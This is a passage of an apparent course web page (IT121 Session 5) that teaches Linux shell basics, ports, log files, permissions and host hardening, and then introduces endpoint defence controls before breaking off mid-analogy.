@@ -1,0 +1,1212 @@
+<title>IT121 Session 5 – Linux Overview &amp; System and Endpoint Protection</title>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;800;900&family=Rajdhani:wght@400;500;600;700&family=IBM+Plex+Mono:wght@400;500;600;700&display=swap" rel="stylesheet">
+
+<style>
+  :root{
+    --bg:#070b0d; --surface:#0d1619; --surface-2:#12232a;
+    --text:#d8fff2; --muted:#6f9994; --border:#1f4441;
+    --accent:#2de2e6; --accent-soft:rgba(45,226,230,.10);
+    --accent-2:#ff2e88; --accent-2-soft:rgba(255,46,136,.10);
+    --danger:#ff4d4d; --danger-soft:rgba(255,77,77,.10);
+    --correct:#39ff88; --correct-soft:rgba(57,255,136,.10);
+    --shadow: 0 0 0 1px rgba(45,226,230,.28), 0 0 20px rgba(45,226,230,.14);
+    --mono:'IBM Plex Mono', monospace;
+    --display:'Orbitron', sans-serif;
+    --sans:'Rajdhani', system-ui, sans-serif;
+  }
+
+  *{box-sizing:border-box;}
+  html{scroll-behavior:smooth; font-size:125%;}
+  @media (prefers-reduced-motion: reduce){ html{scroll-behavior:auto;} *{animation-duration:.001ms !important; transition-duration:.001ms !important;} }
+  body{ margin:0; background:var(--bg); color:var(--text); font-family:var(--sans); line-height:1.55; -webkit-font-smoothing:antialiased;
+    background-image:repeating-linear-gradient(0deg, rgba(45,226,230,.05) 0px, rgba(45,226,230,.05) 1px, transparent 1px, transparent 3px); }
+  a{ color:var(--accent); }
+  ::selection{ background:var(--accent-soft); }
+  .wrap{ max-width:1080px; margin:0 auto; padding:0 24px; }
+
+  header.hero{ border-bottom:2px solid var(--border); padding:56px 0 40px; }
+  .eyebrow{ font-family:var(--mono); font-weight:600; font-size:.95rem; letter-spacing:.14em; text-transform:uppercase; color:var(--accent); text-shadow:0 0 6px rgba(45,226,230,.5); }
+  h1{ font-family:var(--display); font-weight:800; font-size:clamp(2.3rem,4.6vw,3.4rem); line-height:1.02; margin:.25em 0 .3em; text-wrap:balance; letter-spacing:-.01em; text-shadow:0 0 18px rgba(45,226,230,.35); }
+  .hero p.lede{ max-width:62ch; font-size:1.1rem; color:var(--muted); margin:0 0 1.6em; }
+  .factrow{ display:flex; flex-wrap:wrap; gap:10px; }
+  .fact{ font-family:var(--mono); font-size:.9rem; letter-spacing:.02em; background:var(--surface); border:1px solid var(--border); padding:.4em .8em; display:flex; gap:.5em; }
+  .fact b{ color:var(--muted); font-weight:600; text-transform:uppercase; letter-spacing:.06em; font-size:.78rem; }
+
+  nav.index{ position:sticky; top:0; z-index:20; background:color-mix(in srgb, var(--bg) 88%, transparent); backdrop-filter:blur(8px); border-bottom:1px solid var(--accent); box-shadow:0 0 16px rgba(45,226,230,.12); }
+  nav.index .wrap{ display:flex; gap:4px; overflow-x:auto; padding:10px 24px; scrollbar-width:none; }
+  nav.index .wrap::-webkit-scrollbar{ display:none; }
+  nav.index a{ font-family:var(--mono); font-weight:600; letter-spacing:.04em; font-size:1rem; text-decoration:none; color:var(--muted); padding:.4em .9em; white-space:nowrap; border:1px solid transparent; text-transform:uppercase; }
+  nav.index a:hover{ color:var(--text); border-color:var(--border); background:var(--surface); }
+  nav.index a.toc-link{ color:var(--accent); border-right:1.5px solid var(--border); margin-right:8px; padding-right:16px; }
+  nav.index a.toc-link:hover{ background:var(--accent-soft); }
+
+  .back-to-top{ position:fixed; bottom:22px; right:22px; z-index:40; width:50px; height:50px;
+    background:var(--surface); border:1.5px solid var(--text); box-shadow:var(--shadow);
+    font-family:var(--display); font-size:1.4rem; color:var(--text); line-height:1;
+    display:flex; align-items:center; justify-content:center; padding:0; cursor:pointer; text-decoration:none;
+    opacity:0; visibility:hidden; transform:translateY(10px);
+    transition:opacity .25s ease, transform .25s ease, visibility 0s .25s; }
+  .back-to-top.show{ opacity:1; visibility:visible; transform:translateY(0); transition:opacity .25s ease, transform .25s ease, visibility 0s; }
+  .back-to-top:hover{ background:var(--accent-soft); border-color:var(--accent); color:var(--accent); }
+  .back-to-top:focus-visible{ outline:2px solid var(--accent); outline-offset:2px; }
+
+  section{ padding:52px 0; border-bottom:1px solid var(--border); }
+  section:last-of-type{ border-bottom:none; }
+  .section-head{ margin-bottom:28px; max-width:70ch; }
+  .kicker{ font-family:var(--mono); font-weight:600; font-size:.9rem; letter-spacing:.14em; text-transform:uppercase; color:var(--accent-2); margin:0 0 .3em; text-shadow:0 0 6px rgba(255,46,136,.5); }
+  h2{ font-family:var(--display); font-weight:800; font-size:clamp(1.6rem,2.8vw,2.2rem); margin:0 0 .2em; text-wrap:balance; letter-spacing:-.005em; text-shadow:0 0 10px rgba(45,226,230,.2); }
+  .section-head p{ color:var(--muted); margin:.4em 0 0; }
+  h3{ font-family:var(--sans); font-weight:700; font-size:1.08rem; margin:26px 0 10px; }
+
+  .obj-list{ display:grid; gap:12px; grid-template-columns:repeat(auto-fit,minmax(260px,1fr)); list-style:none; margin:0; padding:0; }
+  .obj-list li{ background:var(--surface); border:1px solid var(--border); padding:16px 18px; box-shadow:var(--shadow); font-size:.95rem; }
+  .obj-list li::before{ content:"▹"; color:var(--accent); margin-right:.6em; font-weight:700; }
+
+  figure{ margin:36px 0 0; }
+  figure svg{ width:100%; height:auto; display:block; background:var(--surface); border:1px solid var(--border); }
+  figcaption{ font-size:.85rem; color:var(--muted); margin-top:.6em; }
+  .diagram-grid{ display:grid; gap:32px; grid-template-columns:1fr; }
+  @media(min-width:860px){ .diagram-grid{ grid-template-columns:1fr 1fr; } }
+
+  .model-table{ width:100%; border-collapse:collapse; margin:20px 0; font-size:.92rem; }
+  .model-table th{ font-family:var(--mono); font-weight:700; text-transform:uppercase; letter-spacing:.06em; font-size:.78rem; color:var(--muted); text-align:left; padding:10px 12px; border-bottom:2px solid var(--border); }
+  .model-table td{ padding:10px 12px; border-bottom:1px dashed rgba(45,226,230,.25); vertical-align:top; }
+  .model-table tr:last-child td{ border-bottom:none; }
+
+  .callout{ background:var(--surface); border:1px solid var(--border); border-left:4px solid var(--accent-2); box-shadow:var(--shadow); padding:16px 20px; margin:22px 0; font-size:.92rem; }
+  .callout b{ color:var(--accent-2); }
+  .callout.xref{ font-family:var(--mono); font-size:.85rem; }
+  .callout.xref a{ font-weight:600; }
+
+  .toolbar{ display:flex; gap:10px; align-items:center; margin-bottom:20px; flex-wrap:wrap; }
+  button.btn{ font-family:var(--mono); font-weight:600; letter-spacing:.03em; text-transform:uppercase; font-size:.85rem; background:var(--surface); color:var(--text); border:1px solid var(--border); padding:.6em 1.1em; cursor:pointer; }
+  button.btn:hover{ border-color:var(--accent); color:var(--accent); }
+  button.btn:focus-visible, a:focus-visible, .flashcard:focus-visible, input:focus-visible{ outline:2px solid var(--accent); outline-offset:2px; }
+  #cardProgress{ font-family:var(--mono); font-size:.95rem; color:var(--muted); }
+
+  .card-grid{ display:grid; gap:16px; grid-template-columns:repeat(auto-fill,minmax(230px,1fr)); }
+  .flashcard{ perspective:1200px; height:220px; cursor:pointer; border:none; background:none; padding:0; font-family:inherit; text-align:left; width:100%; color:var(--text); }
+  .flashcard-inner{ position:relative; width:100%; height:100%; transition:transform .5s cubic-bezier(.4,.2,.2,1); transform-style:preserve-3d; -webkit-transform-style:preserve-3d; will-change:transform; }
+  .flashcard.flipped .flashcard-inner{ transform:rotateY(180deg); -webkit-transform:rotateY(180deg); }
+  .flashcard-face{ position:absolute; inset:0; backface-visibility:hidden; -webkit-backface-visibility:hidden; -moz-backface-visibility:hidden; border:1px solid var(--border); box-shadow:var(--shadow); padding:16px; display:flex; flex-direction:column; justify-content:center; }
+  .flashcard-face.front{ background:var(--surface); transform:translateZ(.5px); }
+  .flashcard-face.back{ background:var(--accent-soft); transform:rotateY(180deg) translateZ(.5px); overflow-y:auto; }
+  .flashcard-face .lbl{ font-family:var(--mono); font-weight:600; letter-spacing:.1em; text-transform:uppercase; font-size:.8rem; color:var(--accent-2); margin-bottom:.4em; }
+  .flashcard-face.front .term{ font-family:var(--mono); font-weight:700; font-size:1.15rem; letter-spacing:.01em; }
+  .flashcard-face.back .def{ font-size:.86rem; }
+  .flashcard.known .flashcard-face.front{ border-color:var(--correct); }
+
+  .quiz-q{ background:var(--surface); border:1px solid var(--border); padding:20px 22px; margin-bottom:18px; box-shadow:var(--shadow); }
+  .quiz-q .qtext{ font-weight:700; margin:0 0 14px; }
+  .quiz-q .qnum{ font-family:var(--mono); font-weight:700; color:var(--accent); margin-right:.5em; }
+  .choices{ display:grid; gap:8px; }
+  .choice{ text-align:left; font-family:var(--sans); font-size:.95rem; background:var(--surface-2); border:1px solid var(--border); padding:.7em .9em; cursor:pointer; color:var(--text); }
+  .choice:hover{ border-color:var(--accent); }
+  .choice.correct{ background:var(--correct-soft); border-color:var(--correct); }
+  .choice.incorrect{ background:var(--danger-soft); border-color:var(--danger); }
+  .choice[disabled]{ cursor:default; }
+  .explain{ margin-top:12px; font-size:.88rem; color:var(--muted); border-left:3px solid var(--accent-2); padding-left:12px; display:none; }
+  .explain.show{ display:block; }
+  #quizScore{ font-family:var(--mono); font-size:1rem; color:var(--muted); margin-bottom:16px; }
+
+  .example{ background:var(--surface); border:1px solid var(--border); padding:20px 22px; margin-bottom:16px; box-shadow:var(--shadow); }
+  .example h3{ font-family:var(--mono); font-weight:700; font-size:1.2rem; margin:0 0 8px; }
+  .example .tag{ display:inline-block; font-family:var(--mono); font-weight:600; font-size:.8rem; text-transform:uppercase; letter-spacing:.08em; color:var(--accent-2); background:var(--accent-2-soft); padding:.25em .6em; margin-bottom:10px; }
+  details.solution{ margin-top:12px; }
+  details.solution summary{ cursor:pointer; font-family:var(--mono); font-weight:600; letter-spacing:.03em; text-transform:uppercase; font-size:.85rem; color:var(--accent); list-style:none; display:inline-flex; align-items:center; gap:.4em; }
+  details.solution summary::-webkit-details-marker{ display:none; }
+  details.solution summary::before{ content:"▸"; transition:transform .15s; }
+  details.solution[open] summary::before{ transform:rotate(90deg); }
+  details.solution .solbody{ margin-top:10px; padding:14px 16px; background:var(--surface-2); font-size:.92rem; }
+
+  #glossarySearch{ width:100%; max-width:420px; font-family:var(--sans); font-size:.95rem; padding:.7em .9em; border:1px solid var(--border); background:var(--surface); color:var(--text); margin-bottom:16px; }
+  .alpha-nav{ display:flex; flex-wrap:wrap; gap:4px; margin-bottom:24px; }
+  .alpha-nav a{ font-family:var(--mono); font-weight:600; font-size:.9rem; width:1.9em; height:1.9em; display:flex; align-items:center; justify-content:center; border:1px solid var(--border); text-decoration:none; color:var(--muted); }
+  .alpha-nav a.has{ color:var(--text); }
+  .alpha-nav a.has:hover{ border-color:var(--accent); color:var(--accent); }
+  .glossary-letter{ font-family:var(--mono); font-weight:700; color:var(--accent); font-size:1.3rem; margin:22px 0 8px; }
+  dl.glossary{ margin:0; }
+  dl.glossary .gitem{ border-top:1px solid var(--border); padding:12px 0; }
+  dl.glossary dt{ font-family:var(--mono); font-weight:700; font-size:1.05rem; }
+  dl.glossary dd{ margin:.3em 0 0; color:var(--muted); font-size:.92rem; }
+  .gitem.hidden{ display:none; }
+
+  footer{ padding:32px 0 60px; }
+  footer p{ color:var(--muted); font-size:.9rem; font-family:var(--mono); letter-spacing:.02em; }
+
+  @media(max-width:600px){
+    .card-grid{ grid-template-columns:1fr; }
+    .obj-list{ grid-template-columns:1fr; }
+    .diagram-grid{ grid-template-columns:1fr; }
+    .factrow{ flex-direction:column; }
+  }
+  code{ font-family:var(--mono); font-size:.88em; color:var(--accent); background:var(--accent-soft); padding:.05em .35em; }
+  .callout.analogy{ border-left-color:var(--correct); }
+  .callout.analogy b{ color:var(--correct); }
+  .callout.analogy .lbl{ display:block; font-family:var(--mono); font-weight:700; font-size:.78rem; letter-spacing:.1em; text-transform:uppercase; color:var(--correct); margin-bottom:.5em; text-shadow:0 0 6px rgba(57,255,136,.4); }
+  .callout .src{ display:block; margin-top:.8em; font-family:var(--mono); font-size:.75rem; color:var(--muted); }
+  pre.log{ color-scheme:dark; scrollbar-color:var(--border) #030607; font-family:var(--mono); font-size:.72rem; line-height:1.5; background:#030607; color:var(--correct); border:1px solid var(--border); padding:14px 16px; overflow-x:auto; margin:12px 0; }
+  pre.log code{ background:none; padding:0; }
+</style>
+
+<header class="hero">
+  <div class="wrap">
+    <p class="eyebrow">IT121 · Session 5</p>
+    <h1>Linux Overview &amp; System and Endpoint Protection</h1>
+    <p class="lede">Session 4 ended on the Windows endpoint. This session covers the other operating system every analyst needs: Linux, which runs most servers and almost all security tooling. After Linux comes endpoint protection in general: hardening a host, detecting malware on it, stopping intrusions at the host itself, and controlling what applications are allowed to run.</p>
+    <div class="factrow">
+      <span class="fact"><b>Covers</b> Module 8 (8.1–8.7) &middot; Module 9 (9.1–9.4)</span>
+    </div>
+  </div>
+</header>
+
+<nav class="index" aria-label="Section index">
+  <div class="wrap">
+    <a href="index.html" class="toc-link">↩ Contents</a>
+    <a href="#overview">Overview</a>
+    <a href="#linuxbasics">Linux Basics</a>
+    <a href="#shell">The Shell</a>
+    <a href="#servers">Servers &amp; Clients</a>
+    <a href="#admin">Server Admin</a>
+    <a href="#filesystem">File System</a>
+    <a href="#gui">Linux GUI</a>
+    <a href="#host">Linux Host</a>
+    <a href="#defending">Defending Systems</a>
+    <a href="#antimalware">Antimalware</a>
+    <a href="#hips">Host-Based IPS</a>
+    <a href="#appsec">App Security</a>
+    <a href="#flashcards">Flashcards</a>
+    <a href="#quiz">Quiz</a>
+    <a href="#examples">Examples</a>
+    <a href="#deeper">Going Deeper</a>
+    <a href="#glossary">Glossary</a>
+  </div>
+</nav>
+
+<main class="wrap">
+
+  <!-- ── OVERVIEW ── -->
+  <section id="overview">
+    <div class="section-head">
+      <p class="kicker">Overview</p>
+      <h2>What Session 5 covers</h2>
+      <p>Two modules. First, a working tour of Linux: why analysts need it, how the shell works, how to find which servers a box is running and read their logs, how files and permissions work, and how to spot malware on a Linux host. Then endpoint protection in general: hardening, antimalware, host-based intrusion prevention, and application security.</p>
+    </div>
+    <ul class="obj-list">
+      <li>Explain why Linux skills are essential for network security monitoring and investigation</li>
+      <li>Use the Linux shell to manipulate text files</li>
+      <li>Use the Linux command line to identify servers running on a computer</li>
+      <li>Use commands to locate and monitor log files</li>
+      <li>Use commands to manage the Linux file system and permissions</li>
+      <li>Explain the basic components of the Linux GUI</li>
+      <li>Use tools to detect malware on a Linux host</li>
+      <li>Use processes and procedures to protect systems</li>
+      <li>Explain methods of mitigating malware</li>
+      <li>Recommend endpoint security measures</li>
+      <li>Use malware investigation tools to learn malware features</li>
+    </ul>
+  </section>
+
+  <!-- ── LINUX BASICS (8.1) ── -->
+  <section id="linuxbasics">
+    <div class="section-head">
+      <p class="kicker">Concept 1 · Module 8.1</p>
+      <h2>Linux Basics</h2>
+      <p>Linux is an open-source operating system: anyone can read, change, and redistribute its source code. It's fast, stable, and runs on everything from routers to the servers behind most websites. For a SOC analyst, Linux isn't optional.</p>
+    </div>
+
+    <table class="model-table">
+      <thead><tr><th>Why it matters</th><th>What that means for an analyst</th></tr></thead>
+      <tbody>
+        <tr><td style="font-weight:700;">Open source</td><td>The code can be inspected and customized, so organizations can strip a system down to just what it needs</td></tr>
+        <tr><td style="font-weight:700;">The command line is the main interface</td><td>Almost everything can be done, scripted, and automated from the shell, including on a remote server with no GUI at all</td></tr>
+        <tr><td style="font-weight:700;">Security tools are built for it</td><td>Packet capture (tcpdump, Wireshark), IDS, SIEM, log management, and malware analysis tools mostly run on Linux. Distributions like <b>Security Onion</b> (monitoring) and <b>Kali Linux</b> (penetration testing) come with them preinstalled</td></tr>
+        <tr><td style="font-weight:700;">It's what the servers run</td><td>A large share of the web, DNS, mail, and cloud servers an analyst investigates are Linux hosts</td></tr>
+      </tbody>
+    </table>
+
+    <div class="callout">
+      <b>A distribution ("distro")</b> is the Linux kernel packaged with a set of tools, a package manager, and usually a desktop. Ubuntu, Debian, Fedora, Red Hat Enterprise Linux, Arch, and Kali are all distros. The commands in this session work the same way on nearly all of them.
+    </div>
+  </section>
+
+  <!-- ── THE SHELL (8.2) ── -->
+  <section id="shell">
+    <div class="section-head">
+      <p class="kicker">Concept 2 · Module 8.2</p>
+      <h2>Working in the Linux Shell</h2>
+      <p>The shell (usually <code>bash</code> or <code>zsh</code>) takes typed commands and runs them. You reach it through a <b>terminal emulator</b> window, or over the network with SSH.</p>
+    </div>
+
+    <table class="model-table">
+      <thead><tr><th>Command</th><th>What it does</th></tr></thead>
+      <tbody>
+        <tr><td style="font-weight:700;"><code>man</code></td><td>Opens the manual page for a command (<code>man ls</code>), which is the first place to look when you forget an option</td></tr>
+        <tr><td style="font-weight:700;"><code>pwd</code> / <code>cd</code> / <code>ls</code></td><td>Show the current directory, change directory, list what's in it</td></tr>
+        <tr><td style="font-weight:700;"><code>mkdir</code> / <code>cp</code> / <code>mv</code> / <code>rm</code></td><td>Make a directory, copy, move or rename, and remove files</td></tr>
+        <tr><td style="font-weight:700;"><code>cat</code> / <code>less</code></td><td>Print a whole file to the screen, or page through a long one</td></tr>
+        <tr><td style="font-weight:700;"><code>grep</code></td><td>Search text for a pattern (<code>grep "Failed password" auth.log</code>). Analysts use it constantly</td></tr>
+        <tr><td style="font-weight:700;"><code>sudo</code> / <code>su</code></td><td>Run one command as root, or switch to another user entirely</td></tr>
+        <tr><td style="font-weight:700;"><code>nano</code> / <code>vi</code></td><td>Terminal text editors, for when there's no GUI and a config file needs editing</td></tr>
+      </tbody>
+    </table>
+
+    <div class="callout">
+      <b>In Linux, nearly everything is a text file.</b> Configuration lives in plain text under <code>/etc</code>, and logs are plain text under <code>/var/log</code>. That's why the objective for this subtopic is manipulating text files: reading, searching, and editing text is most of the job.
+    </div>
+  </section>
+
+  <!-- ── SERVERS AND CLIENTS (8.3) ── -->
+  <section id="servers">
+    <div class="section-head">
+      <p class="kicker">Concept 3 · Module 8.3</p>
+      <h2>Linux Servers and Clients</h2>
+      <p>A <b>server</b> is a program that listens on a port and answers requests. A <b>client</b> is the program that sends those requests. Each service listens on a well-known port number, so a port that's open tells you what's running.</p>
+    </div>
+
+    <table class="model-table">
+      <thead><tr><th>Port</th><th>Service</th><th>Port</th><th>Service</th></tr></thead>
+      <tbody>
+        <tr><td style="font-weight:700;">20/21</td><td>FTP</td><td style="font-weight:700;">80</td><td>HTTP</td></tr>
+        <tr><td style="font-weight:700;">22</td><td>SSH</td><td style="font-weight:700;">110</td><td>POP3</td></tr>
+        <tr><td style="font-weight:700;">23</td><td>Telnet</td><td style="font-weight:700;">123</td><td>NTP</td></tr>
+        <tr><td style="font-weight:700;">25</td><td>SMTP</td><td style="font-weight:700;">143</td><td>IMAP</td></tr>
+        <tr><td style="font-weight:700;">53</td><td>DNS</td><td style="font-weight:700;">161</td><td>SNMP</td></tr>
+        <tr><td style="font-weight:700;">67/68</td><td>DHCP</td><td style="font-weight:700;">443</td><td>HTTPS</td></tr>
+      </tbody>
+    </table>
+
+    <h3>Finding what's running</h3>
+    <table class="model-table">
+      <thead><tr><th>Command</th><th>What it shows</th></tr></thead>
+      <tbody>
+        <tr><td style="font-weight:700;"><code>netstat -tuln</code> or <code>ss -tuln</code></td><td>Listening TCP and UDP ports. <code>ss</code> is the newer replacement for <code>netstat</code> on most current distros</td></tr>
+        <tr><td style="font-weight:700;"><code>ps</code> (e.g. <code>ps aux</code>)</td><td>Running processes, including the server programs behind those ports</td></tr>
+      </tbody>
+    </table>
+
+    <div class="callout xref">
+      Same idea as <code>netstat</code> on Windows in <a href="IT121_Session04.html#winconfig">Session 4</a>. An unexpected listening port is suspicious on either OS.
+    </div>
+  </section>
+
+  <!-- ── BASIC SERVER ADMINISTRATION (8.4) ── -->
+  <section id="admin">
+    <div class="section-head">
+      <p class="kicker">Concept 4 · Module 8.4</p>
+      <h2>Basic Server Administration</h2>
+      <p>Every service reads its settings from a configuration file and writes what it does to a log file. Hardening a server and investigating one both begin with those two files.</p>
+    </div>
+
+    <h3>Hardening basics</h3>
+    <ul class="obj-list">
+      <li>Keep the OS and services patched</li>
+      <li>Disable or remove services that aren't needed. A port that isn't open can't be attacked</li>
+      <li>Use SSH instead of Telnet, and disable direct root login over SSH</li>
+      <li>Enforce strong passwords, or better, key-based authentication</li>
+    </ul>
+
+    <h3>Where the logs are</h3>
+    <table class="model-table">
+      <thead><tr><th>Log file</th><th>What it records</th></tr></thead>
+      <tbody>
+        <tr><td style="font-weight:700;"><code>/var/log/auth.log</code> (Debian/Ubuntu) or <code>/var/log/secure</code> (Red Hat family)</td><td>Authentication events: logins, failed passwords, <code>sudo</code> use</td></tr>
+        <tr><td style="font-weight:700;"><code>/var/log/syslog</code> or <code>/var/log/messages</code></td><td>General system activity from many services</td></tr>
+        <tr><td style="font-weight:700;"><code>/var/log/kern.log</code> and <code>dmesg</code></td><td>Kernel messages: hardware, drivers, boot events</td></tr>
+        <tr><td style="font-weight:700;"><code>/var/log/cron</code></td><td>Scheduled jobs run by cron</td></tr>
+        <tr><td style="font-weight:700;">Application logs (e.g. <code>/var/log/apache2/</code>, <code>/var/log/nginx/</code>)</td><td>Per-service activity, like every request a web server handled</td></tr>
+      </tbody>
+    </table>
+
+    <div class="callout">
+      <b><code>tail -f</code> is the live view.</b> <code>tail -f /var/log/auth.log</code> prints new lines as they're written, so you can watch logins happen in real time. On systemd-based distros, <code>journalctl</code> reads the same events from the system journal.
+    </div>
+  </section>
+
+  <!-- ── THE LINUX FILE SYSTEM (8.5) ── -->
+  <section id="filesystem">
+    <div class="section-head">
+      <p class="kicker">Concept 5 · Module 8.5</p>
+      <h2>The Linux File System</h2>
+      <p>Linux has a single directory tree that starts at <code>/</code>. Drives and partitions are <b>mounted</b> into that tree instead of getting their own drive letters.</p>
+    </div>
+
+    <table class="model-table">
+      <thead><tr><th>File system type</th><th>Notes</th></tr></thead>
+      <tbody>
+        <tr><td style="font-weight:700;">ext2 / ext3 / ext4</td><td>The standard Linux file systems. ext3 added journaling, and ext4 is the current default on many distros</td></tr>
+        <tr><td style="font-weight:700;">NFS</td><td>Network File System: mounts a directory shared by another machine over the network</td></tr>
+        <tr><td style="font-weight:700;">swap</td><td>Disk space used as overflow when RAM is full</td></tr>
+        <tr><td style="font-weight:700;">CDFS, HFS+, APFS</td><td>Optical media, and Apple's older and current file systems, which Linux can also mount</td></tr>
+      </tbody>
+    </table>
+
+    <h3>Permissions</h3>
+    <p>Every file has an <b>owner</b>, a <b>group</b>, and <b>others</b>. Each of those three gets <b>r</b>ead, <b>w</b>rite, and e<b>x</b>ecute bits. In numbers, r=4, w=2, x=1, added up for each of the three.</p>
+
+    <figure>
+      <svg viewBox="0 0 520 150" role="img" aria-label="Permission string -rwxr-x--- broken into file type, owner rwx = 7, group r-x = 5, others --- = 0, giving octal 750.">
+        <g font-family="IBM Plex Mono" font-weight="700" font-size="22" text-anchor="middle">
+          <text x="60" y="55" fill="var(--muted)">-</text>
+          <text x="150" y="55" fill="var(--accent)">rwx</text>
+          <text x="280" y="55" fill="var(--accent-2)">r-x</text>
+          <text x="410" y="55" fill="var(--danger)">---</text>
+        </g>
+        <g font-family="IBM Plex Mono" font-size="12" text-anchor="middle" fill="var(--muted)">
+          <text x="60" y="85">type</text>
+          <text x="150" y="85">owner</text>
+          <text x="280" y="85">group</text>
+          <text x="410" y="85">others</text>
+        </g>
+        <g font-family="IBM Plex Mono" font-weight="700" font-size="16" text-anchor="middle">
+          <text x="150" y="120" fill="var(--accent)">4+2+1 = 7</text>
+          <text x="280" y="120" fill="var(--accent-2)">4+0+1 = 5</text>
+          <text x="410" y="120" fill="var(--danger)">0 = 0</text>
+        </g>
+        <line x1="95" y1="28" x2="95" y2="130" stroke="var(--border)"/>
+        <line x1="215" y1="28" x2="215" y2="130" stroke="var(--border)"/>
+        <line x1="345" y1="28" x2="345" y2="130" stroke="var(--border)"/>
+      </svg>
+      <figcaption>The string <code>ls -l</code> shows as <code>-rwxr-x---</code> is octal <b>750</b>: the owner can do anything, the group can read and run the file, and everyone else gets nothing. Set it with <code>chmod 750 file</code>, and change ownership with <code>chown user:group file</code>.</figcaption>
+    </figure>
+
+    <div class="callout">
+      <b>Links:</b> a <b>hard link</b> (<code>ln</code>) is a second name for the same data on disk. A <b>symbolic link</b> (<code>ln -s</code>) is a shortcut that points to a path, and it breaks if the target is moved or deleted.
+    </div>
+  </section>
+
+  <!-- ── THE LINUX GUI (8.6) ── -->
+  <section id="gui">
+    <div class="section-head">
+      <p class="kicker">Concept 6 · Module 8.6</p>
+      <h2>Working with the Linux GUI</h2>
+      <p>Unlike Windows, the Linux graphical interface is a separate, swappable layer on top of the OS. A server usually has no GUI at all.</p>
+    </div>
+
+    <table class="model-table">
+      <thead><tr><th>Component</th><th>What it does</th></tr></thead>
+      <tbody>
+        <tr><td style="font-weight:700;">Display server (X Window System / X11, or Wayland)</td><td>The low-level layer that draws to the screen and handles keyboard and mouse input</td></tr>
+        <tr><td style="font-weight:700;">Window manager</td><td>Controls where windows go and how they look, move, and resize</td></tr>
+        <tr><td style="font-weight:700;">Desktop environment (GNOME, KDE Plasma, Xfce, …)</td><td>The full package: window manager, panels, app menu, file manager, and settings</td></tr>
+      </tbody>
+    </table>
+
+    <div class="callout">
+      <b>The GUI is optional, the shell isn't.</b> Many production servers never install a GUI, which uses fewer resources and leaves less software to attack. Even on a desktop, the terminal is one click away and is where real admin work happens.
+    </div>
+  </section>
+
+  <!-- ── WORKING ON A LINUX HOST (8.7) ── -->
+  <section id="host">
+    <div class="section-head">
+      <p class="kicker">Concept 7 · Module 8.7</p>
+      <h2>Working on a Linux Host</h2>
+      <p>Installing software, keeping it updated, watching processes, and checking for malware. This is day-to-day Linux host care.</p>
+    </div>
+
+    <table class="model-table">
+      <thead><tr><th>Task</th><th>How</th></tr></thead>
+      <tbody>
+        <tr><td style="font-weight:700;">Install / run applications</td><td>Use the distro's <b>package manager</b>: <code>apt</code> (Debian/Ubuntu), <code>dnf</code>/<code>yum</code> (Red Hat family), <code>pacman</code> (Arch). It pulls signed packages from trusted repositories</td></tr>
+        <tr><td style="font-weight:700;">Keep the system up to date</td><td><code>sudo apt update &amp;&amp; sudo apt upgrade</code> (or your distro's equivalent). This is patching, the same job Windows Update does</td></tr>
+        <tr><td style="font-weight:700;">Processes and forks</td><td>A new process is created by <b>forking</b> (copying) an existing one, so every process has a parent. <code>ps</code> lists them, <code>top</code> shows them live, and <code>kill</code> stops one by its PID</td></tr>
+        <tr><td style="font-weight:700;">Malware on a Linux host</td><td>Less common than on Windows, but real, and aimed mostly at servers: backdoors, cryptominers, botnet agents, and <b>rootkits</b></td></tr>
+        <tr><td style="font-weight:700;">Rootkit check</td><td>A rootkit hides itself by modifying the OS. Tools like <code>chkrootkit</code> scan for known rootkit signs</td></tr>
+        <tr><td style="font-weight:700;">Piping commands</td><td><code>|</code> sends one command's output into another: <code>ps aux | grep ssh</code>, or <code>cat auth.log | grep Failed | wc -l</code> to count failed logins</td></tr>
+      </tbody>
+    </table>
+
+    <div class="callout">
+      <b>A rootkit can lie to the tools you'd use to find it.</b> If the kernel or <code>ps</code> itself has been tampered with, a clean-looking process list proves nothing. That's why rootkit checks look for signs of tampering, and why a heavily compromised host is usually rebuilt instead of trusted.
+    </div>
+  </section>
+
+  <!-- ── DEFENDING SYSTEMS AND DEVICES (9.1) ── -->
+  <section id="defending">
+    <div class="section-head">
+      <p class="kicker">Concept 8 · Module 9.1</p>
+      <h2>Defending Systems and Devices</h2>
+      <p>Everything so far comes down to one job: reduce what an attacker can reach, keep what's left patched, and protect the device even when someone has it in their hands.</p>
+    </div>
+
+    <table class="model-table">
+      <thead><tr><th>Control</th><th>What it involves</th></tr></thead>
+      <tbody>
+        <tr><td style="font-weight:700;">Operating system security (hardening)</td><td>Start from a secure baseline: remove unneeded programs and services, change default accounts and passwords, apply least privilege</td></tr>
+        <tr><td style="font-weight:700;">Antimalware</td><td>Antivirus, antispyware, and adware and phishing protection. Only install software from trusted sources</td></tr>
+        <tr><td style="font-weight:700;">Patch management</td><td>A planned process for testing and deploying updates across every system, not just whenever someone remembers</td></tr>
+        <tr><td style="font-weight:700;">Endpoint security</td><td>Host-based firewalls, host-based intrusion detection and prevention, and endpoint security suites (Concepts 9–10)</td></tr>
+        <tr><td style="font-weight:700;">Host encryption</td><td>Encrypt files or entire drives (e.g. BitLocker, EFS) so stolen data can't be read</td></tr>
+        <tr><td style="font-weight:700;">Boot integrity</td><td>UEFI <b>Secure Boot</b> only loads a signed, trusted bootloader and OS, which blocks bootkits that load before the OS can defend itself</td></tr>
+        <tr><td style="font-weight:700;">Physical protection</td><td>Cable locks, locked rooms and cabinets, badge access, and asset tags. Someone with physical access can bypass most software controls</td></tr>
+      </tbody>
+    </table>
+
+    <p>Every row in that table depends on one thing: knowing what's <em>supposed</em> to be there. You can't remove unneeded services, spot an unauthorized program, or notice a device that doesn't belong unless you've first written down what normal looks like. That record is a <b>baseline configuration</b> (how each system should be set up) plus an <b>asset inventory</b> (every system, device, and piece of software you own). Defenders relied on the same idea long before computers existed.</p>
+
+    <div class="callout analogy">
+      <span class="lbl">Think of it like… the village that knew everyone</span>
+      The book <em>Cyberjutsu</em> compares modern defense to feudal Japan, where shinobi (ninja) spied on and infiltrated villages and castles. The hardest targets were small, isolated villages. Each had its own dialect, clothing, and customs, and everyone knew everyone, so a stranger stood out right away. Strangers were watched, turned away from lodging, and told nothing. Villages even had a pecking order much like <a href="#filesystem">Concept 5's permissions</a>: ordinary villagers, a chief who could lock the gates (root), and a lord at the center whom almost nobody could reach (the kernel).<br><br>
